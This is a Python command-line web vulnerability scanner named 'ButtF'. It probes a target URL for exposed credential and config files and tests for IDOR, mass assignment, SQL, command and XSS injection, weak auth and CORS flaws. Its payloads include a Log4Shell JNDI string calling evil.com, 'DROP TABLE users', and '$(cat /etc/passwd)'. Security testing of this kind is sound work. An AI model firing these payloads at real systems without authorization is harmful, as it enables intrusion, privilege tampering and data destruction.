#!/usr/bin/env python3
###ButtF - Backend Misconfiguration & Logic Flaw Exploitation Tool##
###A comprehensive security scanner for backend vulnerabilities, logic flaws, and CVE detection###

import argparse
import requests
import json
import re
import time
import urllib.parse
from typing import Dict, List, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
import sys

@dataclass
class Vulnerability:
    #Represents a discovered vulnerability
    severity: str
    category: str
    endpoint: str
    description: str
    evidence: str
    cve_id: Optional[str] = None
    remediation: str = ""

class ButtF:
    #Main scanner class for backend misconfiguration and logic flaw detection
    
    def __init__(self, target: str, threads: int = 10, timeout: int = 10):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.vulnerabilities: List[Vulnerability] = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1'
        })
        
    def scan(self, modules: List[str]) -> List[Vulnerability]:
        #execute scan with specified modules
        print(f"[*] Starting ButtF scan against: {self.target}")
        print(f"[*] Active modules: {', '.join(modules)}\n")
        
        scan_functions = {
            'misconfig': self._scan_misconfigurations,
            'logic': self._scan_logic_flaws,
            'cve': self._scan_known_cves,
            'auth': self._scan_auth_issues,
            'injection': self._scan_injection_points,
            'exposure': self._scan_data_exposure,
            'rate': self._scan_rate_limiting,
            'cors': self._scan_cors_issues
        }
        
        for module in modules:
            if module in scan_functions:
                print(f"[+] Running {module} module...")
                scan_functions[module]()
            else:
                print(f"[-] Unknown module: {module}")
        
        return self.vulnerabilities
    
    def _scan_misconfigurations(self):
        #Scan for common backend misconfigurations
        misconfig_checks = [
            #Provided / common
            ('/robots.txt', 'Information Disclosure', 'Exposed robots.txt'),
            ('/.git/config', 'Source Code Exposure', 'Git repository exposed'),
            ('/.env', 'Configuration Exposure', 'Environment file exposed'),
            ('/config.json', 'Configuration Exposure', 'Config file exposed'),
            ('/admin', 'Unauthorized Access', 'Admin panel accessible'),
            ('/api/v1/swagger', 'API Documentation Exposure', 'Swagger docs exposed'),
            ('/graphql', 'GraphQL Introspection', 'GraphQL endpoint exposed'),
            ('/.aws/credentials', 'Credential Exposure', 'AWS credentials exposed'),
            ('/backup.sql', 'Database Backup Exposure', 'Database backup accessible'),
            ('/.htaccess', 'Server Configuration Exposure', 'Apache config exposed'),

            #Version control & repo leaks
            ('/.git/', 'Source Code Exposure', 'Git directory accessible'),
            ('/.git/HEAD', 'Source Code Exposure', 'Git HEAD file accessible'),
            ('/.gitignore', 'Information Disclosure', 'Git ignore reveals structure'),
            ('/.git-credentials', 'Credential Exposure', 'Git credentials exposed'),
            ('/.svn/', 'Source Code Exposure', 'SVN repository exposed'),
            ('/.hg/', 'Source Code Exposure', 'Mercurial repository exposed'),

            #Backup / archive files
            ('/backup.zip', 'Database Backup Exposure', 'Zipped site backup accessible'),
            ('/backup.tar.gz', 'Database Backup Exposure', 'TAR backup accessible'),
            ('/site.bak', 'Backup Exposure', 'Site backup file accessible'),
            ('/db_dump.sql', 'Database Backup Exposure', 'Database dump accessible'),
            ('/dump.sql', 'Database Backup Exposure', 'Database dump accessible'),

            #Credentials / secrets
            ('/.env.local', 'Configuration Exposure', '.env.local exposed'),
            ('/.env.production', 'Configuration Exposure', 'Production env exposed'),
            ('/secrets.json', 'Credential Exposure', 'Secrets file accessible'),
            ('/id_rsa', 'Credential Exposure', 'Private SSH key exposed'),
            ('/id_rsa.pub', 'Information Disclosure', 'SSH public key exposed'),
            ('/credentials.csv', 'Credential Exposure', 'Credential list accessible'),

            #Config files (various platforms)
            ('/wp-config.php', 'Configuration Exposure', 'WordPress config exposed'),
            ('/config.php', 'Configuration Exposure', 'PHP config exposed'),
            ('/config.yml', 'Configuration Exposure', 'YAML config exposed'),
            ('/composer.json', 'Information Disclosure', 'PHP dependency manifest exposed'),
            ('/package.json', 'Information Disclosure', 'Node dependency manifest exposed'),
            ('/package-lock.json', 'Information Disclosure', 'Node lockfile reveals deps'),
            ('/yarn.lock', 'Information Disclosure', 'Yarn lockfile reveals deps'),
            ('/docker-compose.yml', 'Configuration Exposure', 'Docker stack file exposed'),
            ('/Dockerfile', 'Configuration Exposure', 'Dockerfile reveals build details'),
            ('/kubernetes.yml', 'Configuration Exposure', 'Kubernetes manifests exposed'),
            ('/azuredeploy.json', 'Configuration Exposure', 'Azure ARM template exposed'),

            #Logs & debug
            ('/logs/', 'Information Disclosure', 'Logs directory accessible'),
            ('/error_log', 'Information Disclosure', 'Server error log exposed'),
            ('/access_log', 'Information Disclosure', 'Access log exposed'),
            ('/phpinfo.php', 'Configuration Exposure', 'phpinfo() endpoint accessible'),
            ('/debug', 'Information Disclosure', 'Debug panel exposed'),
            ('/debug/vars', 'Information Disclosure', 'Debug vars accessible'),
            ('/actuator', 'Information Disclosure', 'Spring Boot actuator root exposed'),
            ('/actuator/env', 'Credential Exposure', 'Actuator env variables exposed'),
            ('/actuator/health', 'Information Disclosure', 'Service health endpoint exposed'),
            ('/metrics', 'Information Disclosure', 'Application metrics exposed'),

            # API / docs / endpoints
            ('/openapi.json', 'API Documentation Exposure', 'OpenAPI spec exposed'),
            ('/swagger.json', 'API Documentation Exposure', 'Swagger spec exposed'),
            ('/swagger-ui/', 'API Documentation Exposure', 'Swagger UI exposed'),
            ('/api/docs', 'API Documentation Exposure', 'API docs accessible'),
            ('/api/explorer', 'API Documentation Exposure', 'API explorer accessible'),

            # CMS / common web app endpoints
            ('/wp-admin/', 'Unauthorized Access', 'WordPress admin panel exposed'),
            ('/wp-login.php', 'Authorization', 'WordPress login exposed'),
            ('/xmlrpc.php', 'Functionality Exposure', 'XML-RPC endpoint exposed'),
            ('/administrator/', 'Unauthorized Access', 'Joomla admin panel accessible'),
            ('/adminer.php', 'Unauthorized Access', 'Adminer DB tool exposed'),

            # CI/CD / build servers
            ('/jenkins/', 'Unauthorized Access', 'Jenkins UI exposed'),
            ('/gitlab/', 'Source Code Exposure', 'GitLab instance exposed'),
            ('/git/', 'Source Code Exposure', 'Git web UI exposed'),
            ('/.gitlab-ci.yml', 'Information Disclosure', 'CI config reveals pipelines'),
            ('/circleci/', 'CI Exposure', 'CircleCI endpoints exposed'),
            ('/.travis.yml', 'Information Disclosure', 'Travis CI config exposed'),
            ('/netlify.toml', 'Configuration Exposure', 'Netlify config exposed'),
            ('/drone/', 'CI Exposure', 'Drone CI exposed'),

            # Monitoring / dashboards
            ('/grafana/', 'Information Disclosure', 'Grafana dashboards exposed'),
            ('/kibana/', 'Information Disclosure', 'Kibana exposed'),
            ('/prometheus/', 'Information Disclosure', 'Prometheus exposed'),
            ('/elastic/', 'Information Disclosure', 'Elasticsearch endpoint exposed'),
            ('/elasticsearch/', 'Information Disclosure', 'Elasticsearch node accessible'),
            ('/status/', 'Information Disclosure', 'Status page accessible'),

            # Storage / files / uploads
            ('/uploads/', 'Information Disclosure', 'Upload directory accessible'),
            ('/files/', 'Information Disclosure', 'Generic files endpoint accessible'),
            ('/storage/', 'Information Disclosure', 'Storage frontend accessible'),
            ('/public/', 'Information Disclosure', 'Public directory listing possible'),
            ('/sitemap.xml', 'Information Disclosure', 'Sitemap revealed'),

            # Misc config & policy files
            ('/crossdomain.xml', 'Information Disclosure', 'Flash cross-domain policy exposed'),
            ('/clientaccesspolicy.xml', 'Information Disclosure', 'Client access policy exposed'),
            ('/.well-known/security.txt', 'Information Disclosure', 'Security contact file exposed'),
            ('/.DS_Store', 'Information Disclosure', 'Mac .DS_Store reveals filenames'),
            ('/README.md', 'Information Disclosure', 'README reveals info'),
            ('/LICENSE', 'Information Disclosure', 'License file reveals project info'),

            # Backup / hidden variants & extensions
            ('/config.php.bak', 'Configuration Exposure', 'Backup config file exposed'),
            ('/config.php~', 'Configuration Exposure', 'Temp/backup config file exposed'),
            ('/web.config.bak', 'Configuration Exposure', 'IIS backup config exposed'),
            ('/site.old/', 'Deprecated Site Exposure', 'Old site version accessible'),
            ('/old/', 'Deprecated Site Exposure', 'Old site accessible'),

            # Database & management panels
            ('/phpmyadmin/', 'Unauthorized Access', 'phpMyAdmin exposed'),
            ('/pma/', 'Unauthorized Access', 'phpMyAdmin alias exposed'),
            ('/phpmyadmin/index.php', 'Unauthorized Access', 'phpMyAdmin exposed'),
            ('/dbadmin/', 'Unauthorized Access', 'DB admin panel exposed'),

            # Application artifacts
            ('/node_modules/', 'Information Disclosure', 'node_modules accessible'),
            ('/vendor/', 'Information Disclosure', 'Composer vendor dir exposed'),
            ('/npm-debug.log', 'Information Disclosure', 'NPM debug log exposed'),

            # Cloud provider artifacts
            ('/aws/credentials', 'Credential Exposure', 'AWS credentials file exposed'),
            ('/azure-pipelines.yml', 'Information Disclosure', 'Azure pipelines config exposed'),
            ('/google-services.json', 'Configuration Exposure', 'Firebase/Google config exposed'),

            # Misc sensitive files
            ('/.bash_history', 'Information Disclosure', 'User command history exposed'),
            ('/.ssh/authorized_keys', 'Information Disclosure', 'Authorized SSH keys exposed'),
            ('/.gitlab/ci', 'Information Disclosure', 'GitLab CI info exposed'),
            ('//.ftpconfig', 'Credential Exposure', 'FTP credentials file exposed'),

            # Misc endpoints that sometimes leak secrets
            ('/heapdump', 'Information Disclosure', 'Heap dump accessible'),
            ('/heapdump.hprof', 'Information Disclosure', 'Heap dump file accessible'),
            ('/jolokia', 'Information Disclosure', 'Jolokia JMX bridge exposed'),
            ('/actuator/env', 'Credential Exposure', 'Actuator env endpoint exposes env variables'),
            ('/debug/pprof', 'Information Disclosure', 'Profiling endpoints exposed'),

            # Optional/heuristic checks (patterns rather than single files)
            ('/backup.zip.old', 'Database Backup Exposure', 'Variant backup file accessible'),
            ('/site_backup.tar', 'Database Backup Exposure', 'Site backup archive accessible'),
            ('/credentials.bak', 'Credential Exposure', 'Credential backup file accessible'),

            # Catch-alls for interesting filenames (good for wordlist expansion)
            ('/config', 'Configuration Exposure', 'Generic config file accessible'),
            ('/config.bak', 'Configuration Exposure', 'Config backup accessible'),
            ('/secret', 'Credential Exposure', 'Secret file accessible'),
            ('/secrets', 'Credential Exposure', 'Secrets directory accessible'),
            ('/private', 'Information Disclosure', 'Private directory accessible'),
            ]
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self._check_endpoint, path, category, desc): (path, category, desc)
                for path, category, desc in misconfig_checks
            }
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    self.vulnerabilities.append(result)
    
    def _check_endpoint(self, path: str, category: str, description: str) -> Optional[Vulnerability]:
        #Check if an endpoint exists and is misconfigured
        try:
            url = f"{self.target}{path}"
            response = self.session.get(url, timeout=self.timeout, allow_redirects=False)
            
            if response.status_code == 200:
                severity = 'HIGH' if any(x in path for x in ['.git', '.env', 'backup', 'credentials']) else 'MEDIUM'
                return Vulnerability(
                    severity=severity,
                    category=category,
                    endpoint=path,
                    description=description,
                    evidence=f"Status: {response.status_code}, Size: {len(response.content)} bytes",
                    remediation=f"Restrict access to {path} or remove it from public access"
                )
        except Exception as e:
            pass
        return None
    
    def _scan_logic_flaws(self):
        #Scan for business logic flaws
        print("  [*] Testing for IDOR vulnerabilities...")
        self._test_idor()
        
        print("  [*] Testing for mass assignment...")
        self._test_mass_assignment()
        
        print("  [*] Testing for workflow bypasses...")
        self._test_workflow_bypass()
    
    def _test_idor(self):
        #Test for Insecure Direct Object Reference
        test_endpoints = [
            '/api/user/1',
            '/api/user/2',
            '/api/order/1',
            '/api/document/1'
        ]
        
        for endpoint in test_endpoints:
            try:
                url = f"{self.target}{endpoint}"
                r1 = self.session.get(url, timeout=self.timeout)
                
                if r1.status_code == 200:
                    modified = endpoint.replace('/1', '/2').replace('/user/', '/users/')
                    r2 = self.session.get(f"{self.target}{modified}", timeout=self.timeout)
                    
                    if r2.status_code == 200 and r1.text != r2.text:
                        self.vulnerabilities.append(Vulnerability(
                            severity='HIGH',
                            category='IDOR',
                            endpoint=endpoint,
                            description='Potential Insecure Direct Object Reference',
                            evidence=f"Different objects accessible without authorization check",
                            remediation='Implement proper authorization checks for object access'
                        ))
            except Exception:
                pass
    
    def _test_mass_assignment(self):
        #Test for mass assignment vulnerabilities
        test_payloads = [
            {'role': 'admin', 'isAdmin': True, 'privileges': 'all'},
            {'is_verified': True, 'account_type': 'premium'},
        ]
        
        api_endpoints = ['/api/user/update', '/api/profile', '/api/account']
        
        for endpoint in api_endpoints:
            for payload in test_payloads:
                try:
                    url = f"{self.target}{endpoint}"
                    response = self.session.post(url, json=payload, timeout=self.timeout)
                    
                    if response.status_code in [200, 201] and 'error' not in response.text.lower():
                        self.vulnerabilities.append(Vulnerability(
                            severity='CRITICAL',
                            category='Mass Assignment',
                            endpoint=endpoint,
                            description='Potential mass assignment vulnerability detected',
                            evidence=f"Payload accepted: {json.dumps(payload)}",
                            remediation='Implement whitelist-based parameter binding'
                        ))
                except Exception:
                    pass
    
    def _test_workflow_bypass(self):
        #Test for workflow bypass vulnerabilities
        test_cases = [
            ('/api/checkout/confirm', 'POST', 'Payment workflow bypass'),
            ('/api/verify/skip', 'POST', 'Verification bypass'),
            ('/api/admin/access', 'GET', 'Admin workflow bypass')
        ]
        
        for endpoint, method, description in test_cases:
            try:
                url = f"{self.target}{endpoint}"
                if method == 'POST':
                    response = self.session.post(url, json={}, timeout=self.timeout)
                else:
                    response = self.session.get(url, timeout=self.timeout)
                
                if response.status_code in [200, 201, 302]:
                    self.vulnerabilities.append(Vulnerability(
                        severity='CRITICAL',
                        category='Workflow Bypass',
                        endpoint=endpoint,
                        description=description,
                        evidence=f"Endpoint accessible without proper workflow: {response.status_code}",
                        remediation='Implement state validation and workflow enforcement'
                    ))
            except Exception:
                pass
    
    def _scan_known_cves(self):
        #Scan for known CVE patterns
        cve_patterns = {
            'CVE-2021-44228': {
                'pattern': r'log4j',
                'header': 'X-Api-Version',
                'payload': '${jndi:ldap://evil.com/a}',
                'description': 'Log4Shell vulnerability'
            },
            'CVE-2022-22965': {
                'pattern': r'spring',
                'param': 'class.module.classLoader',
                'description': 'Spring4Shell vulnerability'
            }
        }
        
        print("  [*] Checking for known CVE signatures...")
        
        for cve_id, config in cve_patterns.items():
            try:
                headers = {}
                if 'header' in config:
                    headers[config['header']] = config.get('payload', '')
                
                response = self.session.get(self.target, headers=headers, timeout=self.timeout)
                
                if 'pattern' in config and config['pattern'] in response.text.lower():
                    self.vulnerabilities.append(Vulnerability(
                        severity='CRITICAL',
                        category='Known CVE',
                        endpoint='/',
                        description=config['description'],
                        evidence=f"Pattern '{config['pattern']}' detected",
                        cve_id=cve_id,
                        remediation=f"Apply patches for {cve_id}"
                    ))
            except Exception:
                pass
    
    def _scan_auth_issues(self):
        #Scan for authentication and authorization issues
        print("  [*] Testing authentication mechanisms...")
        
        auth_tests = [
            ('JWT Token Validation', self._test_jwt_issues),
            ('Session Management', self._test_session_issues),
            ('Password Policy', self._test_password_policy)
        ]
        
        for test_name, test_func in auth_tests:
            try:
                test_func()
            except Exception as e:
                pass
    
    def _test_jwt_issues(self):
        #Test for JWT-related vulnerabilities
        jwt_endpoints = ['/api/auth/login', '/api/token', '/auth/jwt']
        
        for endpoint in jwt_endpoints:
            try:
                url = f"{self.target}{endpoint}"
                response = self.session.post(url, json={'username': 'test', 'password': 'test'}, timeout=self.timeout)
                
                if 'token' in response.text.lower() or 'jwt' in response.text.lower():
                    token_match = re.search(r'eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*', response.text)
                    if token_match:
                        token = token_match.group(0)
                        if token.count('.') == 2:
                            parts = token.split('.')
                            if parts[2] == '':
                                self.vulnerabilities.append(Vulnerability(
                                    severity='CRITICAL',
                                    category='JWT Security',
                                    endpoint=endpoint,
                                    description='JWT token without signature detected',
                                    evidence='Unsigned JWT token found',
                                    remediation='Implement proper JWT signature validation'
                                ))
            except Exception:
                pass
    
    def _test_session_issues(self):
        #Test session management issues
        try:
            r1 = self.session.get(self.target, timeout=self.timeout)
            cookies = r1.cookies
            
            insecure_cookies = [
                cookie for cookie in cookies 
                if not cookie.secure or not cookie.has_nonstandard_attr('HttpOnly')
            ]
            
            if insecure_cookies:
                self.vulnerabilities.append(Vulnerability(
                    severity='MEDIUM',
                    category='Session Management',
                    endpoint='/',
                    description='Insecure cookie configuration',
                    evidence=f"Cookies without Secure/HttpOnly flags: {[c.name for c in insecure_cookies]}",
                    remediation='Set Secure and HttpOnly flags on all session cookies'
                ))
        except Exception:
            pass
    
    def _test_password_policy(self):
        #Test password policy enforcement
        weak_passwords = ['123456', 'password', 'admin', 'test']
        register_endpoints = ['/api/register', '/api/signup', '/register']
        
        for endpoint in register_endpoints:
            for password in weak_passwords:
                try:
                    url = f"{self.target}{endpoint}"
                    payload = {'username': 'testuser', 'password': password, 'email': 'test@test.com'}
                    response = self.session.post(url, json=payload, timeout=self.timeout)
                    
                    if response.status_code in [200, 201] and 'error' not in response.text.lower():
                        self.vulnerabilities.append(Vulnerability(
                            severity='MEDIUM',
                            category='Password Policy',
                            endpoint=endpoint,
                            description='Weak password policy',
                            evidence=f"Weak password '{password}' accepted",
                            remediation='Implement strong password requirements'
                        ))
                        break
                except Exception:
                    pass
    
    def _scan_injection_points(self):
        #Scan for injection vulnerabilities
        print("  [*] Testing for SQL injection...")
        self._test_sql_injection()
        
        print("  [*] Testing for command injection...")
        self._test_command_injection()
        
        print("  [*] Testing for XSS...")
        self._test_xss()
    
    def _test_sql_injection(self):
        #Test for SQL injection vulnerabilities
        sql_payloads = ["'", "1' OR '1'='1", "admin'--", "1; DROP TABLE users--"]
        test_params = ['id', 'user', 'search', 'query']
        
        for param in test_params:
            for payload in sql_payloads:
                try:
                    url = f"{self.target}/api/search?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    error_patterns = ['sql', 'mysql', 'sqlite', 'postgresql', 'oracle', 'syntax error']
                    if any(pattern in response.text.lower() for pattern in error_patterns):
                        self.vulnerabilities.append(Vulnerability(
                            severity='CRITICAL',
                            category='SQL Injection',
                            endpoint=f'/api/search?{param}=',
                            description='SQL injection vulnerability detected',
                            evidence=f"Error message in response with payload: {payload}",
                            remediation='Use parameterized queries and input validation'
                        ))
                        break
                except Exception:
                    pass
    
    def _test_command_injection(self):
        #Test for command injection vulnerabilities
        cmd_payloads = ['; ls', '| whoami', '`id`', '$(cat /etc/passwd)']
        test_endpoints = ['/api/exec', '/api/run', '/api/command']
        
        for endpoint in test_endpoints:
            for payload in cmd_payloads:
                try:
                    url = f"{self.target}{endpoint}"
                    response = self.session.post(url, json={'cmd': payload}, timeout=self.timeout)
                    
                    if any(indicator in response.text for indicator in ['root:', 'uid=', 'gid=']):
                        self.vulnerabilities.append(Vulnerability(
                            severity='CRITICAL',
                            category='Command Injection',
                            endpoint=endpoint,
                            description='Command injection vulnerability detected',
                            evidence=f"System output in response",
                            remediation='Never execute user input as system commands'
                        ))
                        break
                except Exception:
                    pass
    
    def _test_xss(self):
        #Test for XSS vulnerabilities
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            "javascript:alert(1)"
        ]
        
        test_params = ['q', 'search', 'name', 'comment']
        
        for param in test_params:
            for payload in xss_payloads:
                try:
                    url = f"{self.target}/?{param}={urllib.parse.quote(payload)}"
                    response = self.session.get(url, timeout=self.timeout)
                    
                    if payload in response.text or payload.replace('"', '&quot;') in response.text:
                        self.vulnerabilities.append(Vulnerability(
                            severity='HIGH',
                            category='XSS',
                            endpoint=f'/?{param}=',
                            description='Cross-Site Scripting vulnerability detected',
                            evidence=f"Payload reflected in response",
                            remediation='Implement proper output encoding and CSP headers'
                        ))
                        break
                except Exception:
                    pass
    
    def _scan_data_exposure(self):
        #Scan for sensitive data exposure
        print("  [*] Checking for data exposure...")
        
        sensitive_endpoints = [
            '/api/users', '/api/customers', '/api/admin/logs',
            '/api/debug', '/api/internal', '/.git/HEAD'
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                url = f"{self.target}{endpoint}"
                response = self.session.get(url, timeout=self.timeout)
                
                sensitive_patterns = ['password', 'api_key', 'secret', 'token', 'credit_card', 'ssn']
                if any(pattern in response.text.lower() for pattern in sensitive_patterns):
                    self.vulnerabilities.append(Vulnerability(
                        severity='HIGH',
                        category='Data Exposure',
                        endpoint=endpoint,
                        description='Sensitive data exposure detected',
                        evidence='Sensitive keywords found in response',
                        remediation='Implement proper access controls and data filtering'
                    ))
            except Exception:
                pass
    
    def _scan_rate_limiting(self):
        #Test rate limiting implementation
        print("  [*] Testing rate limiting...")
        
        test_endpoint = '/api/login'
        url = f"{self.target}{test_endpoint}"
        
        try:
            responses = []
            for i in range(50):
                r = self.session.post(url, json={'username': 'test', 'password': 'test'}, timeout=self.timeout)
                responses.append(r.status_code)
            
            if all(status != 429 for status in responses):
                self.vulnerabilities.append(Vulnerability(
                    severity='MEDIUM',
                    category='Rate Limiting',
                    endpoint=test_endpoint,
                    description='No rate limiting detected',
                    evidence='50 requests completed without rate limit response',
                    remediation='Implement rate limiting on authentication endpoints'
                ))
        except Exception:
            pass
    
    def _scan_cors_issues(self):
        #Scan for CORS misconfigurations
        print("  [*] Checking CORS configuration...")
        
        malicious_origins = ['http://evil.com', 'null', 'http://attacker.com']
        
        for origin in malicious_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(self.target, headers=headers, timeout=self.timeout)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if acao == origin or acao == '*':
                    severity = 'CRITICAL' if acac == 'true' else 'HIGH'
                    self.vulnerabilities.append(Vulnerability(
                        severity=severity,
                        category='CORS Misconfiguration',
                        endpoint='/',
                        description='Insecure CORS policy detected',
                        evidence=f"ACAO: {acao}, Credentials: {acac}",
                        remediation='Implement strict origin whitelist for CORS'
                    ))
                    break
            except Exception:
                pass
    
    def generate_report(self, output_format: str = 'text') -> str:
        #Generate vulnerability report
        if output_format == 'json':
            return json.dumps([
                {
                    'severity': v.severity,
                    'category': v.category,
                    'endpoint': v.endpoint,
                    'description': v.description,
                    'evidence': v.evidence,
                    'cve_id': v.cve_id,
                    'remediation': v.remediation
                } for v in self.vulnerabilities
            ], indent=2)
        
        report = "\n" + "="*80 + "\n"
        report += "ButtF Security Scan Report\n"
        report += "="*80 + "\n\n"
        report += f"Target: {self.target}\n"
        report += f"Total Vulnerabilities: {len(self.vulnerabilities)}\n\n"
        
        severity_counts = {}
        for v in self.vulnerabilities:
            severity_counts[v.severity] = severity_counts.get(v.severity, 0) + 1
        
        report += "Severity Breakdown:\n"
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            if severity in severity_counts:
                report += f"  {severity}: {severity_counts[severity]}\n"
        
        report += "\n" + "-"*80 + "\n\n"
        
        for idx, vuln in enumerate(self.vulnerabilities, 1):
            report += f"[{idx}] {vuln.severity} - {vuln.category}\n"
            report += f"Endpoint: {vuln.endpoint}\n"
            report += f"Description: {vuln.description}\n"
            report += f"Evidence: {vuln.evidence}\n"
            if vuln.cve_id:
                report += f"CVE: {vuln.cve_id}\n"
            report += f"Remediation: {vuln.remediation}\n"
            report += "-"*80 + "\n\n"
        
        return report

def main():
    parser = argparse.ArgumentParser(
        description='ButtF - Backend Misconfiguration & Logic Flaw Exploitation Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python buttf.py -u https://example.com -m all
  python buttf.py -u https://api.example.com -m misconfig,logic,cve
  python buttf.py -u https://example.com -m auth,injection -o json
  python buttf.py -u https://example.com --threads 20 --timeout 15

Modules:
  misconfig  - Backend misconfiguration detection
  logic      - Business logic flaw detection
  cve        - Known CVE pattern matching
  auth       - Authentication/authorization testing
  injection  - Injection vulnerability testing
  exposure   - Sensitive data exposure detection
  rate       - Rate limiting validation
  cors       - CORS misconfiguration detection
  all        - Run all modules
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-m', '--modules', required=True, 
                       help='Comma-separated list of modules or "all"')
    parser.add_argument('-t', '--threads', type=int, default=10, 
                       help='Number of threads (default: 10)')
    parser.add_argument('--timeout', type=int, default=10, 
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-o', '--output', choices=['text', 'json'], default='text',
                       help='Output format (default: text)')
    parser.add_argument('-f', '--file', help='Save report to file')
    
    args = parser.parse_args()
    
    modules = args.modules.lower().split(',')
    if 'all' in modules:
        modules = ['misconfig', 'logic', 'cve', 'auth', 'injection', 'exposure', 'rate', 'cors']
    
    scanner = ButtF(args.url, threads=args.threads, timeout=args.timeout)
    
    try:
        vulnerabilities = scanner.scan(modules)
        report = scanner.generate_report(args.output)
        
        if args.file:
            with open(args.file, 'w') as f:
                f.write(report)
            print(f"\n[+] Report saved to {args.file}")
        else:
            print(report)
        
        print(f"\n[*] Scan complete. Found {len(vulnerabilities)} vulnerabilities.")
        
    except KeyboardInterrupt:
        print("\n[!] Scan interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()
